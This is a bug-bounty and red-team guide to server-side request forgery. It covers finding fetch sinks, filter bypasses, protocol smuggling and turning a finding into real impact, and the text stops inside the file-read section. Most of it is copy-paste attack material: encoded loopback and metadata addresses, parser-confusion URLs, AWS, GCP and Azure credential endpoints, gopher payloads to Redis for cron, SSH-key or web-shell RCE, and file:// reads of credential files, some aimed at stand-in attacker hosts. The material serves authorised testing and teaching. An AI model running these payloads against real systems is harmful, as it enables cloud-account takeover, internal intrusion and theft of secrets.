# Server-Side Request Forgery (SSRF) — Complete In-Depth Testing Guide (Expert / Bug-Bounty & Red-Team Edition)

**Author:** x8bitranjit
**Scope:** Any feature where the **server fetches a URL/resource** — webhooks, URL preview/unfurl, import-from-URL, PDF/HTML generators, image proxies/thumbnailers, RSS/feed readers, SSO/OIDC, document converters, integrations, health checks, file parsers (SVG/XXE)
**Platforms:** Kali/Linux first-class; Windows/WSL notes provided
**Companion files in this folder:**
- `SSRF_ARSENAL.md` — IP encodings, cloud-metadata URLs (every provider), bypass strings, gopher payloads (copy-paste)
- `SSRF_CHECKLIST.md` — the testing-order checklist you tick per sink
- `SSRF_REPORT_TEMPLATE.md` — the report skeleton that gets paid
- `poc/` — runnable tooling (IP encoder, redirect server, gopher/Redis payload builder, SSRF prober)

> **Companion to the Recon · FileUpload · XXE · OAuth-SSO · Host-Header guides** (they find or feed SSRF — Recon locates the fetch sinks, FileUpload/XXE reach it via SVG/external entities, OAuth-SSO via `request_uri`/`jku`, Host-Header via routing-based SSRF). Same philosophy: *find* is Part I–II, *get paid* is Part III–IV. SSRF is one of the **highest-paying** web classes because a single fetch can reach **cloud metadata → IAM credentials → full cloud-account takeover**. But it's also the class most often reported at the wrong severity — "the server pinged my collaborator" is *confirmation*, not *impact*. Read Part III before you celebrate a callback.

---

> ### ⚡ READ THIS FIRST — why most SSRF reports underpay (or get closed)
> 1. **A Collaborator hit proves SSRF exists; it does not prove impact.** The finding is **what internal/cloud thing you reached** — metadata creds, an internal admin API, a database via gopher, a local file. An SSRF that can *only* reach arbitrary **external** URLs (and the feature was *meant* to fetch external URLs) is often **Low/Info**. Climb inward.
> 2. **The whole game is reachability.** Can you steer the server's request from "external URLs it's allowed to fetch" to **`127.0.0.1` / internal hosts / `169.254.169.254`**? That pivot — via IP obfuscation, DNS rebinding, redirects, or parser confusion — *is* the exploit. (Part II.)
> 3. **Cloud metadata is the crown jewel.** `169.254.169.254` (AWS/Azure/etc.) and `metadata.google.internal` (GCP) hand out **temporary IAM credentials**. SSRF → metadata → creds → S3/everything = **Critical**, and it's the first thing to try. Mind **IMDSv2** (needs a `PUT` token header) — it changes the technique (§11).
> 4. **Protocol matters.** `http://` reads/triggers; **`gopher://`** lets you send *arbitrary bytes* to internal TCP services (Redis/Memcached/SMTP/raw HTTP POST) → often **RCE**. `file://` reads local files. Always test which schemes the fetcher supports (§10).
> 5. **Blind ≠ worthless, but blind needs escalation.** If you can't see the response, use timing/status oracles and OOB to map the internal network, then reach something that acts on a *blind* request (metadata exfil via redirect, gopher write). (§15.)
>
> **Where the money is (memorize this order):** ① **cloud metadata → IAM creds → cloud takeover** → ② **gopher/dict to internal services → RCE** (Redis cron/SSH, internal unauth APIs via raw POST) → ③ **internal HTTP to admin/unauth services & internal port scan** → ④ **local file read (`file://`)** → ⑤ *then* external-only/blind SSRF and DoS as **Low–Medium**, not headliners.

---

## Table of Contents

**▶ [Master Testing Sequence — the testing order](#master-testing-sequence--the-testing-order)**

**PART I — FOUNDATIONS, RECON & BASELINE**
1. [Environment & Tooling Setup](#1-environment--tooling-setup)
2. [SSRF Anatomy — Types, Sinks & Why It Pays](#2-ssrf-anatomy--types-sinks--why-it-pays)
3. [Reconnaissance — Find Every URL-Fetch Sink](#3-reconnaissance--find-every-url-fetch-sink)
4. [Baseline — Confirm the Server Fetches Your URL (OOB)](#4-baseline--confirm-the-server-fetches-your-url-oob)

**PART II — REACHABILITY & FILTER BYPASS (work in this order)**
5. [Mapping Reachability — External / Internal / Localhost / Metadata](#5-mapping-reachability)
6. [IP & Host Obfuscation Bypasses](#6-ip--host-obfuscation-bypasses)
7. [DNS-Based Bypasses (Rebinding, Wildcard DNS)](#7-dns-based-bypasses)
8. [Redirect-Based Bypasses](#8-redirect-based-bypasses)
9. [Allowlist / Denylist Bypasses (Parser Confusion)](#9-allowlist--denylist-bypasses)
10. [Protocol Smuggling (gopher / dict / file / ftp)](#10-protocol-smuggling)

**PART III — EXPLOITATION BY IMPACT (where the money is)**
11. [Cloud Metadata — AWS / GCP / Azure / Others](#11-cloud-metadata--the-crown-jewel)
12. [Internal Network Recon & Port Scanning](#12-internal-network-recon--port-scanning)
13. [Internal Service Exploitation via gopher (Redis/etc. → RCE)](#13-internal-service-exploitation-via-gopher)
14. [Local File Read (`file://`)](#14-local-file-read)
15. [Blind SSRF — Confirmation & Escalation](#15-blind-ssrf--confirmation--escalation)
16. [SSRF in Specific Features (PDF/Headless, Image Proxy, Webhooks, SVG/XXE)](#16-ssrf-in-specific-features)
17. [Second-Order / Stored SSRF](#17-second-order--stored-ssrf)

**PART IV — VALIDITY, SEVERITY & REPORTING (the bug-bounty layer)**
18. [The Escalation Mindset](#18-the-escalation-mindset)
19. [The Validity-First Mindset](#19-the-validity-first-mindset)
20. [False Positives — STOP reporting these](#20-false-positives--stop-reporting-these-auto-reject-list)
21. [Severity Calibration](#21-severity-calibration--how-triagers-really-rate-ssrf)
22. [Impact-Escalation Playbooks — "you found X, now do Y"](#22-impact-escalation-playbooks--you-found-x-now-do-y)
23. [Building a Professional, Safe PoC](#23-building-a-professional-safe-poc)
24. [Reporting, CWE/CVSS & De-duplication](#24-reporting-cwecvss--de-duplication)
25. [Automation & Red-Team Notes](#25-automation--red-team-notes)

**Appendices**
- [Appendix A — SSRF Workflow Cheat Sheet](#appendix-a--ssrf-workflow-cheat-sheet)
- [Appendix B — SSRF Attack Decision Tree](#appendix-b--ssrf-attack-decision-tree)
- [Appendix C — Important Links](#appendix-c--important-links)

---

# Master Testing Sequence — The Testing Order

> **This is the spine.** Work top-to-bottom. Each phase says *what to do*, *which § for detail*, and the *deliverable*. Numbered sections (1–25) are the reference detail; this is the order you execute.

```
PHASE 0  RECON & LAB       → find EVERY url-fetch sink (§3) · stand up OOB listener + a redirect server (§1)
PHASE 1  BASELINE  ★       → confirm the server fetches YOUR url (OOB callback). In-band? blind? semi-blind? (§4)
PHASE 2  REACHABILITY      → can you steer it inward? external→localhost→internal→metadata (§5)
PHASE 3  FILTER BYPASS     → defeat the SSRF defense to reach internal/metadata:
                             IP obfuscation (§6) · DNS rebinding (§7) · redirects (§8) · parser confusion (§9) · protocols (§10)
PHASE 4  IMPACT  ⭐ (money) → turn reach into harm:
                             cloud metadata→IAM creds (§11) · internal port scan (§12) · gopher→service RCE (§13) ·
                             file read (§14) · blind escalation (§15) · feature-specific (§16) · stored SSRF (§17)
PHASE 5  VALIDATE → REPORT → validity (§19) · false-positive filter (§20) · severity+CVSS+CWE-918 (§21) ·
                             SAFE PoC (§23) · dedup (§24) · report template
```

**Phase-by-phase, with the deliverable before moving on:**

1. **PHASE 0 — Recon & lab.** Enumerate **every** sink where the server fetches a URL (§3) — webhooks, previews, import-from-URL, PDF gen, image proxy, SSO, file parsers. Stand up an **OOB listener** (interactsh/Collaborator) and a **redirect server** (`poc/redirect_server.py`) you'll need for allowlist bypass. *Deliverable:* a list of fetch sinks + a live OOB host + a redirect host.
2. **PHASE 1 — Baseline ⭐.** For each sink, point it at your OOB host and confirm the **server** makes the request (source IP = server/cloud, not you). Classify: **in-band** (response shown), **blind** (only OOB), or **semi-blind** (status/timing/error differ) (§4). *Deliverable:* confirmed SSRF + its observability class.
3. **PHASE 2 — Reachability.** Probe what the server can reach: external only? `127.0.0.1`/`localhost`? internal hosts? `169.254.169.254`? This determines impact ceiling (§5). *Deliverable:* a reachability map.
4. **PHASE 3 — Filter bypass.** If a defense blocks internal/metadata, defeat it: IP obfuscation (§6), DNS rebinding (§7), redirect chaining (§8), parser-confusion allowlist bypass (§9), and protocol expansion (§10). *Deliverable:* a request that reaches internal/metadata despite the filter.
5. **PHASE 4 — Impact ⭐.** Convert reach into the highest impact: cloud metadata → IAM creds (§11), internal port scan + service hits (§12), gopher → Redis/etc. → RCE (§13), local file read (§14); escalate blind cases (§15); exploit feature-specific sinks (§16); stored SSRF (§17). *Deliverable:* demonstrated impact (creds, internal action, RCE, file read).
6. **PHASE 5 — Validate → report.** Apply validity & false-positive filters (§19/§20), set a defensible CVSS/CWE-918 (§21), build a clean *safe* PoC (§23), de-dup, write it up (§24). *Deliverable:* the submitted report.

Reference anytime: payloads → `SSRF_ARSENAL.md`; checklist → `SSRF_CHECKLIST.md`; scripts → `poc/`; playbooks **§22**.

---

# PART I — FOUNDATIONS, RECON & BASELINE

# 1. Environment & Tooling Setup

SSRF testing needs three things you control: a way to **tamper the request** (Burp), an **OOB callback** to catch blind hits, and a **redirect server** (for allowlist bypass).

| Tool | Job |
|------|-----|
| **Burp Suite** (Repeater/Intruder) | tamper the URL param/header; replay; the core tool |
| **interactsh / Burp Collaborator** | OOB callback — **essential**; catches blind SSRF + shows the server's source IP |
| **Collaborator Everywhere (BApp)** | auto-injects your OOB host into headers across all traffic → finds hidden SSRF |
| **`poc/redirect_server.py`** | hosts a `302 → internal/metadata` to bypass allowlists (§8) |
| **`poc/ip_encoder.py`** | generate every IP-obfuscation form of a target (§6) |
| **`poc/gopher_redis.py`** | build `gopher://` payloads to talk to internal Redis/etc. (§13) |
| **a public box + ngrok/cloudflared** | host the redirect server + DTD/payloads on a reachable URL |
| **SSRFmap / Gopherus** | automated SSRF exploitation + gopher payload generation (Redis/MySQL/FastCGI/SMTP) |
| **nuclei** | templated SSRF/known-sink checks |
| **dnsx / a custom DNS** (rebinder) | DNS rebinding for TOCTOU allowlist bypass (§7) |

```bash
# Kali/WSL
git clone https://github.com/swisskyrepo/SSRFmap && pip install -r SSRFmap/requirements.txt
git clone https://github.com/tarunkant/Gopherus      # gopher payloads (redis/mysql/smtp/fastcgi)
interactsh-client -v                                  # your OOB host (logs DNS+HTTP + source IP)
python3 poc/redirect_server.py --to "http://169.254.169.254/latest/meta-data/"   # see poc/
```
> **The OOB host is non-negotiable.** Most real-world SSRF is **blind**; the Collaborator/interactsh callback (with the server's source IP) is both your *confirmation* and key *evidence*. Set it up before you start.

> **Windows:** tamper in Burp on Windows; run the Python `poc/` helpers and SSRFmap/Gopherus in **WSL**.

---

# 2. SSRF Anatomy — Types, Sinks & Why It Pays

## 2.1 What SSRF is
The application takes an attacker-influenced URL/host and **the server** makes a request to it. You borrow the server's network position — past the firewall, with its cloud identity. The bug is the server reaching somewhere it shouldn't *on your behalf*.

## 2.2 Observability classes (decides your technique)
```
IN-BAND      → the fetched response is returned to you (you SEE internal data). Easiest; highest immediate impact.
SEMI-BLIND   → you don't see the body, but status code / timing / error / response size differ by target → an ORACLE.
BLIND        → no visible difference; only your OOB host logs the hit → confirm via callback, escalate via redirect/gopher.
```

## 2.3 Where SSRF sinks live
```
□ URL params:   url= uri= path= dest= redirect= return= next= continue= image= img= source= src= target=
                callback= webhook= feed= rss= host= port= site= html= pdf= document= file= load= fetch= proxy= view=
□ Features:     webhooks · URL preview/unfurl (chat/social) · import-from-URL · "fetch by link" · avatar-by-URL
                PDF/HTML→image generators (headless Chrome / wkhtmltopdf) · image proxy/thumbnailer · RSS/feed readers
                SSO/OIDC (jwks_uri / openid-configuration / redirect) · document/format converters · API integrations
                health/uptime checkers · link validators · XML/SVG parsers (XXE→SSRF) · video transcoders (FFmpeg HLS)
□ Headers:      X-Forwarded-For · X-Forwarded-Host · Host (routing) · Referer · True-Client-IP · X-Real-IP · custom
□ File-borne:   SVG / Office / XML (XXE → SSRF, see FileUpload guide §14) · PDF link rendering · M3U/HLS playlists
□ Indirect:     a value you control gets logged/processed by a backend that then fetches it (second-order, §17)
```

## 2.4 Why it pays so well
- **Cloud identity:** the server holds IAM credentials reachable at the metadata IP → SSRF leaks them → cloud takeover.
- **Network position:** the server sits inside the perimeter → SSRF reaches internal-only admin panels, databases, CI, k8s.
- **Protocol leverage:** `gopher://` turns "fetch a URL" into "send arbitrary bytes to any TCP service" → unauth internal POSTs and RCE.

> **The mental model:** you're not attacking the URL — you're **renting the server's network card and cloud badge**. Severity = how far inside you can reach and what you can make the server *do* there.

---

# 3. Reconnaissance — Find Every URL-Fetch Sink

Most hunters test one obvious `url=` param. The high-impact sinks are the **server-side processors**.

```
□ Obvious params:     anything that takes a URL/host/path (list in §2.3). Fuzz param NAMES (Arjun, param-miner).
□ Webhooks:           settings → "webhook URL", Slack/Discord/CI integrations, payment callbacks → server POSTs to your URL.
□ URL preview:        paste a link in chat/comments/profile → server fetches it to unfurl (title/og:image). Classic SSRF.
□ Import/convert:     "import from URL", CSV/XML import-by-link, "convert document at URL", "fetch logo from link".
□ PDF/screenshot gen: "export to PDF", "generate invoice", "website screenshot" → headless browser fetches → SSRF + file read.
□ Image proxy:        /proxy?url= , image resize/CDN that fetches remote images, gravatar-style avatar-by-URL.
□ SSO/OIDC:           openid-configuration URL, jwks_uri, SAML metadata URL (also see JWT guide §11 jku).
□ Headers:            try your OOB host in X-Forwarded-For / Referer / X-Forwarded-Host on EVERY request (Collaborator Everywhere).
□ Hidden/API:         grep JS/swagger (Recon guide §15/§16) for fetch/axios/curl/http.get with user-controlled URLs.
□ File parsers:       SVG/Office/XML uploads (FileUpload guide §14) reaching external entities → SSRF.
```
**Recon tips:** in JS/source, grep for `axios`, `fetch(`, `request(`, `http.get`, `curl`, `file_get_contents`, `URL(`, `urllib`, `HttpClient`. Each with a user-influenced argument is a candidate.

> **If this → then that:** "import from URL" / webhook / URL-preview exists → go straight to **baseline** (§4) then **metadata** (§11) — these are the fastest Criticals. A **PDF/screenshot** generator → test SSRF *and* local-file read (`file://`) — headless renderers often allow both (§16).

---

# 4. Baseline — Confirm the Server Fetches Your URL (OOB)

**Do this before any bypass.** Point the sink at your OOB host and verify the **server** (not your browser) makes the request.

## 4.1 The baseline test
```
1. Put your OOB host in the URL param/feature:   url=http://YOUR.oast.fun/baseline
2. Watch interactsh/Collaborator for a hit.
3. Check the SOURCE IP of the hit:
   - your IP            → the app made YOU fetch it (client-side; not SSRF — could be a redirect, not server-side).
   - a server/cloud IP  → SERVER-SIDE FETCH = SSRF confirmed. Note the IP (it tells you the cloud/region).
4. Note DNS-only vs HTTP hit: a DNS lookup alone still confirms the resolver ran server-side.
```

## 4.2 Classify observability (§2.2)
```
□ Is the fetched response shown back to you?           → IN-BAND (try internal HTTP & read it, §12).
□ Different status/time/error for reachable vs not?    → SEMI-BLIND oracle (port scan via timing, §12).
□ Only the OOB callback, nothing else?                 → BLIND (escalate via redirect/gopher/metadata-exfil, §15).
```

## 4.3 Note what you'll need next
- The **cloud provider** (from the source IP / reverse DNS / behavior) → which metadata endpoint to hit (§11).
- Which **schemes** are accepted (`http`, `https`, `gopher`, `file`, `dict`) — test each now (§10).
- Whether the fetcher **follows redirects** (point your OOB host at a `302` and see if it follows) — gold for allowlist bypass (§8).

> **Don't stop at the callback.** A baseline OOB hit is **confirmation, not the finding**. The report is what you reach in Phase 4. Triagers see "server pinged my Collaborator" constantly; the bounty is "...and here are the IAM credentials."

---

# PART II — REACHABILITY & FILTER BYPASS (work in this order)

> Full payload lists are in `SSRF_ARSENAL.md`. These sections teach the *logic* of steering the request inward.

# 5. Mapping Reachability

Once SSRF is confirmed, find how far in you can reach — this sets the severity ceiling.

```
Probe, in order (each a separate test):
  http://YOUR.oast.fun/            → external (baseline)             → confirms fetch
  http://127.0.0.1/  /localhost/    → loopback                        → internal services on the box
  http://127.0.0.1:<port>/          → common ports (22,80,443,2375,3306,5432,6379,8080,9200,...)  → service discovery (§12)
  http://169.254.169.254/           → cloud metadata                  → IAM creds (§11)  ⭐
  http://<internal-range>/          → 10.x / 172.16-31.x / 192.168.x  → internal hosts/admin
  file:///etc/passwd                → local file read (§14)
  http://internal-hostname/         → names from JS/CT (Recon §7/§15) → internal apps
```
- **If localhost/internal is blocked but external works** → there's an SSRF filter; go to Part II bypasses (§6–§9).
- **If everything internal is reachable directly** → no filter; go straight to impact (§11–§14).

> The reachability map *is* your impact plan. Metadata reachable → §11. Internal HTTP reachable + in-band → §12. Only OOB → §15. `gopher` accepted → §13.

---

# 6. IP & Host Obfuscation Bypasses

When a filter blocks `127.0.0.1`/`169.254.169.254`/internal ranges by string-matching, encode the IP so it still resolves to the same address but dodges the match. (Full set + a generator in `poc/ip_encoder.py`.)

```
Target 127.0.0.1:
  Decimal:        http://2130706433/
  Octal:          http://0177.0.0.1/   http://0177.0.0.01/
  Hex:            http://0x7f000001/   http://0x7f.0x0.0x0.0x1/
  Short:          http://127.1/        http://127.0.1/
  Mixed:          http://0x7f.1/       http://127.0.0.0x1/
  IPv6 loopback:  http://[::1]/        http://[0:0:0:0:0:0:0:1]/
  IPv4-in-IPv6:   http://[::ffff:127.0.0.1]/   http://[::ffff:7f00:1]/
  Wildcard DNS:   http://127.0.0.1.nip.io/   http://localtest.me/   http://spoofed.<yourdomain>/ (A→127.0.0.1)

Target 169.254.169.254 (metadata):
  Decimal:        http://2852039166/
  Hex:            http://0xa9fea9fe/
  Octal:          http://0251.0376.0251.0376/
  IPv6-mapped:    http://[::ffff:169.254.169.254]/
  Dotted-decimal alt + trailing dot:  http://169.254.169.254./
  Wildcard DNS:   http://169.254.169.254.nip.io/
```
**Why it works:** the *filter* parses the string naively (regex/blocklist), but the *HTTP client / OS resolver* normalizes octal/hex/decimal/short forms to the real IP. The gap between the two parsers is the bypass.

> **If this → then that:** filter blocks the literal `169.254.169.254` → try **decimal `2852039166`** and **`[::ffff:169.254.169.254]`** first; one of them almost always reaches IMDS.

---

# 7. DNS-Based Bypasses

## 7.1 Wildcard-DNS services (point a name at an internal IP)
Services that resolve any name to an embedded IP let you supply a *hostname* (passing a "must be a domain" check) that resolves internal:
```
127.0.0.1.nip.io      → 127.0.0.1
169.254.169.254.nip.io→ 169.254.169.254
<ip>.sslip.io  ·  localtest.me  ·  spoofed.burpcollaborator.net
# or your own DNS A-record: evil.yourdomain.com → 169.254.169.254
```

## 7.2 DNS rebinding (defeat TOCTOU allowlists)
When the app **validates** the host's IP (resolves it, checks it's public) and then **re-resolves** to fetch — supply a domain whose DNS answer **changes between the two lookups** (low TTL): first a public IP (passes the check), then `169.254.169.254`/internal (used for the fetch).
```
1. Control a domain with a DNS server (or use a rebinding service: rebind.network, 1u.ms, taviso's rbndr).
2. Answer A record: public IP for lookup #1, internal IP for lookup #2 (TTL 0).
3. The app validates (sees public) then fetches (resolves internal) → bypass.
```
> Rebinding is the answer when the app does "resolve → check IP is public → fetch" as **two separate resolutions**. It's the canonical bypass for "SSRF protection that validates the resolved IP." Tooling: `poc/` notes + public rebinders.

---

# 8. Redirect-Based Bypasses

If the fetcher **validates the initial URL** (must be an allowed host) but **follows redirects**, host a URL on an allowed/your domain that `30x` redirects to the internal/metadata target. The validation passes on the first URL; the fetch lands internal.
```
1. Server allows http://YOUR.com/x  (or only checks the first hop).
2. YOUR.com/x  →  302 Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/
3. Fetcher follows → reaches metadata.
```
Use `poc/redirect_server.py --to <internal-url>`. Also try:
- **Open redirect on an allowed host** (the app's own domain): `allowed.com/redirect?url=http://169.254.169.254/` — passes a "same-domain" check, then bounces internal.
- **Protocol downgrade across the redirect** (`http`→`gopher`/`file` if the client honors it — rare but devastating).
- **Multiple redirect hops** to defeat naive "only check final == initial host" logic.

> **If this → then that:** baseline showed the fetcher follows redirects (§4.3) → redirect-to-metadata is usually the cleanest bypass of an allowlist. Combine with an **open redirect** on the target's own domain to also pass same-origin checks.

---

# 9. Allowlist / Denylist Bypasses (Parser Confusion)

URL parsers disagree about where the *host* is. Exploit the gap between the **validator's** parse and the **fetcher's** parse.
```
Credentials trick:   http://allowed.com@169.254.169.254/      (validator sees allowed.com; client connects to the host AFTER @)
Fragment:            http://169.254.169.254/#@allowed.com      /  http://169.254.169.254/#.allowed.com
Backslash/confusion: http://allowed.com\@169.254.169.254/      http://169.254.169.254\\@allowed.com
                     http://allowed.com/169.254.169.254
Whitespace/CR:       http://169.254.169.254%0d%0a@allowed.com  http://169.254.169.254%09.allowed.com
Subdomain/suffix:    http://169.254.169.254.allowed.com (if attacker controls *.allowed.com or it's a suffix match)
                     http://allowed.com.evil.com   http://evil-allowed.com  (weak "contains allowed.com" checks)
Userinfo + port:     http://allowed.com:80@169.254.169.254:80/
Unicode/IDN:         http://169。254。169。254/  (ideographic dots)  ·  http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/
Double-encoding:     %2569.254 ... (validator decodes once, client twice)
```
**The method:** send a candidate, observe whether the OOB hit comes from the *intended internal* target (check via the in-band response or a metadata-specific marker). The parser pair that disagrees is your bypass.

> Classic real-world bug: `http://allowed.com@169.254.169.254/`. The validator regex matches `allowed.com`; the HTTP library connects to everything after the `@`. Always try the `@`, `#`, and backslash variants.

---

# 10. Protocol Smuggling (gopher / dict / file / ftp)

`http(s)` is just one scheme. The others massively change impact — **always test which the fetcher accepts** (point the sink at each and observe).
```
file://    → read local files (§14):  file:///etc/passwd  file:///proc/self/environ  file:///C:/Windows/win.ini
gopher://  → send ARBITRARY bytes to any TCP service (§13): the king of SSRF→RCE.
             gopher://127.0.0.1:6379/_<redis-commands>   gopher://127.0.0.1:25/_<smtp>   raw HTTP POST to internal APIs
dict://    → talk to simple text protocols / read service banners: dict://127.0.0.1:6379/INFO
ftp://     → some clients; data exfil / internal FTP
ldap://    → internal LDAP (rare)
http(s)    → standard fetch / GET internal APIs / metadata
```
**How to test acceptance:** `url=gopher://YOUR.oast.fun:80/_GET%20/x` and watch the raw bytes arrive at a netcat listener — if they do, gopher is live and you can craft service-specific payloads (§13).

> **If this → then that:** `gopher://` is accepted **and** an internal service is reachable (Redis on 6379, etc., found in §12) → you can issue **arbitrary commands** to it → frequently **RCE** (§13). This is the highest-impact SSRF path after metadata.

---

# PART III — EXPLOITATION BY IMPACT (where the money is)

> Every PoC here uses **read-only proof / benign markers** and your **own** OOB host. Never use stolen creds to touch real data, never run destructive internal commands (§23).

# 11. Cloud Metadata — The Crown Jewel

The metadata service hands out **temporary IAM credentials** and instance config. SSRF → metadata → creds → cloud-account compromise = **Critical**. Try this first when metadata is reachable.

## 11.1 AWS (IMDS)
```
# IMDSv1 (no header needed) — try directly:
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/        → lists the role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>  → AccessKeyId/SecretAccessKey/Token  ⭐
http://169.254.169.254/latest/user-data/                                 → often startup scripts WITH secrets
http://169.254.169.254/latest/dynamic/instance-identity/document         → account id / region
```
**IMDSv2 (token-based):** requires a `PUT /latest/api/token` with header `X-aws-ec2-metadata-token-ttl-seconds`, then sending that token as `X-aws-ec2-metadata-token` on the GET. A plain GET SSRF can't add headers — so you need **full request control** (`gopher://` to craft the raw PUT+GET, §13) or a sink that lets you set headers. If only IMDSv2 is enabled and you can't set headers, metadata may be **out of reach** — note it honestly (§20).
```bash
# IMDSv2 walk via gopher (when you have gopher:// or full request control, §13):
#  1) PUT to get a token:  gopher://169.254.169.254:80/_PUT%20/latest/api/token%20HTTP/1.1%0d%0aHost:169.254.169.254%0d%0aX-aws-ec2-metadata-token-ttl-seconds:21600%0d%0a%0d%0a
#  2) GET creds with the token:  ...GET /latest/meta-data/iam/security-credentials/<ROLE> ... X-aws-ec2-metadata-token:<token>...
# (Gopherus/poc helpers build the URL-encoded raw requests for you.)
```

## 11.1.1 AWS container & function credentials (ECS / Fargate / Lambda / EKS) — often the ONLY creds
On **containers/serverless** there's frequently **no EC2 IMDS** — the creds live elsewhere, and they're missed constantly:
```
# ECS / Fargate task role — relative URI in env AWS_CONTAINER_CREDENTIALS_RELATIVE_URI:
http://169.254.170.2/v2/credentials/                          → lists the GUID(s)
http://169.254.170.2/v2/credentials/<GUID>                    → AccessKeyId/SecretAccessKey/Token  ⭐
http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI} (newer: AWS_CONTAINER_CREDENTIALS_FULL_URI on a 169.254.170.x host)
# Lambda — creds are in the ENVIRONMENT (reach via file:// or an RCE), not a metadata IP:
file:///proc/self/environ   → AWS_ACCESS_KEY_ID / _SECRET_ACCESS_KEY / _SESSION_TOKEN (+ AWS_LAMBDA_* , handler secrets)
# EKS / IRSA — web-identity token to assume the pod's role:
file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token   (+ AWS_ROLE_ARN / AWS_WEB_IDENTITY_TOKEN_FILE in env)
```
> **If this → then that:** EC2 IMDS (`169.254.169.254`) returns nothing or IMDSv2-only blocks you → you're likely on **ECS/Fargate** (try **`169.254.170.2/v2/credentials/`**) or **Lambda** (read `/proc/self/environ` via `file://`/RCE) or **EKS** (the IRSA web-identity token). These container/serverless credential paths are the modern reality and the most-missed Critical — always try `169.254.170.2` when the EC2 IP is dead.

## 11.2 GCP (needs a header)
```
http://metadata.google.internal/computeMetadata/v1/   (header: Metadata-Flavor: Google)
.../instance/service-accounts/default/token            → OAuth access token  ⭐
.../instance/attributes/                               → startup scripts/secrets (often the juiciest)
# ONE-SHOT recursive dump (token + attributes + everything in a single request):
http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json   (header: Metadata-Flavor: Google)
# legacy v1beta1 path did NOT require the header (try it on older setups):
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
# also reachable via the IP: http://169.254.169.254/computeMetadata/v1/...
```
GCP **requires** the `Metadata-Flavor: Google` header → you need a sink that sets it, or gopher/header-injection. The **`?recursive=true&alt=json`** form dumps everything in one go; the **`v1beta1`** path historically skipped the header check.

## 11.3 Azure / Others
```
Azure:        http://169.254.169.254/metadata/instance?api-version=2021-02-01   (header: Metadata: true)
              .../metadata/identity/oauth2/token?...&resource=https://management.azure.com/   → token
DigitalOcean: http://169.254.169.254/metadata/v1/   (no header) → .../user-data, droplet id
Oracle OCI:   http://169.254.169.254/opc/v2/instance/   (header: Authorization: Bearer Oracle)
Alibaba:      http://100.100.100.200/latest/meta-data/
Kubernetes:   service-account token at file:///var/run/secrets/kubernetes.io/serviceaccount/token (via file://),
              kubelet :10250, API :6443, etcd :2379 (internal)
```

## 11.4 Prove impact safely, then escalate
```bash
# Validate stolen AWS creds are LIVE (read-only — guide §23). Use the creds you retrieved:
aws sts get-caller-identity   # proves the creds work + shows the principal — that's your PoC. STOP there.
# (Do NOT enumerate/exfiltrate real S3 data. get-caller-identity is sufficient proof of Critical.)
```
> **If this → then that:** you retrieved `AccessKeyId/SecretAccessKey/Token` → run **only** `aws sts get-caller-identity` to prove they're live; that's a complete Critical PoC. Listing buckets or reading data is unnecessary and crosses the line (§23). For GCP/Azure tokens, show the token + the scopes endpoint, not actions on real resources.

---

# 12. Internal Network Recon & Port Scanning

With internal HTTP reach (in-band or an oracle), map the internal network and find services to hit.

```
□ Port scan via SSRF: request http://127.0.0.1:<port>/ across a port list; distinguish open/closed by
   status code / response time / error string (semi-blind oracle, §2.2). Open ports + banners = targets.
□ Internal host discovery: hit internal ranges (10.x/172.16-31.x/192.168.x) + names from JS/CT (Recon §7/§15).
□ Read internal HTTP (in-band): internal admin panels, dashboards, unauth APIs, cloud console proxies, CI (Jenkins),
   k8s dashboards, Spring /actuator, Elasticsearch (:9200/_cat/indices), Consul, etc. — often UNAUTHENTICATED internally.
```
**High-value internal ports:**
```
6379 Redis · 11211 Memcached · 9200/9300 Elasticsearch · 5601 Kibana · 27017 Mongo · 3306 MySQL · 5432 Postgres
2375 Docker · 10250 Kubelet · 6443 k8s API · 8500 Consul · 8080/8443 internal apps · 9000 SonarQube/Portainer
15672 RabbitMQ · 8086 InfluxDB · 5000 internal registry · 25/587 SMTP
```
> **If this → then that:** in-band SSRF + internal Elasticsearch on :9200 → `GET http://127.0.0.1:9200/_cat/indices` reads index names; `/_search` reads data → internal data breach (High–Critical). Redis on :6379 reachable + gopher accepted → **RCE** (§13).

---

# 13. Internal Service Exploitation via gopher

`gopher://` sends **arbitrary bytes** to a TCP port, so you can speak a service's protocol directly. This turns SSRF into **unauthenticated internal command execution** — frequently RCE. Use **Gopherus**/`poc/gopher_redis.py` to build payloads.

## 13.1 Redis → RCE (the classic)
Redis (6379) commonly has no auth internally. Via gopher you can write a file the server later executes:
```
Techniques (Gopherus automates the gopher encoding):
  - Write a cron job:   SET a crontab line → CONFIG SET dir /var/spool/cron → CONFIG SET dbfilename root → SAVE → cron runs it.
  - Write an SSH key into authorized_keys.
  - Write a web shell into the web root (CONFIG SET dir <webroot> → SET payload → SAVE).
# Build it (BENIGN proof first — e.g. SET a marker key, then INFO, to prove you control Redis):
python3 poc/gopher_redis.py --host 127.0.0.1 --port 6379 --benign     # SETs ssrf-poc marker + INFO
```
> **Prove control benignly first** (`SET ssrf-poc <token>` then read it back / `INFO`) — that already demonstrates Critical (arbitrary internal Redis command via SSRF). The cron/SSH/web-shell escalation proves RCE; do it only with explicit authorization and clean up (§23).

## 13.2 Other gopher targets
```
MySQL/Postgres (3306/5432) → run queries (Gopherus has modules).
SMTP (25/587)              → send internal mail / spoof.
FastCGI (9000)             → RCE on PHP-FPM (Gopherus FastCGI module).
Memcached (11211)          → read/poison cache.
Raw HTTP POST to internal APIs → trigger state-changing internal actions that trust the network (no auth).
```
> **If this → then that:** §12 found Redis/MySQL/FastCGI internally **and** §10 showed gopher is accepted → Gopherus the matching payload → **RCE**. This is the top SSRF outcome after metadata creds.

---

# 14. Local File Read (`file://`)

If the fetcher accepts `file://`, you read arbitrary local files — secrets, config, cloud creds, source.
```
file:///etc/passwd                                  proof
file:///proc/self/environ                           env vars (often secrets/tokens)
file:///proc/self/cwd/                               app working dir
file:///etc/hostname                                 benign PoC marker
file:///var/run/secrets/kubernetes.io/serviceaccount/token   k8s SA token (→ cluster access)
file:///root/.aws/credentials  file:///home/<u>/.aws/credentials  cloud creds
file:///app/.env  file:///var/www/html/config.php    app secrets
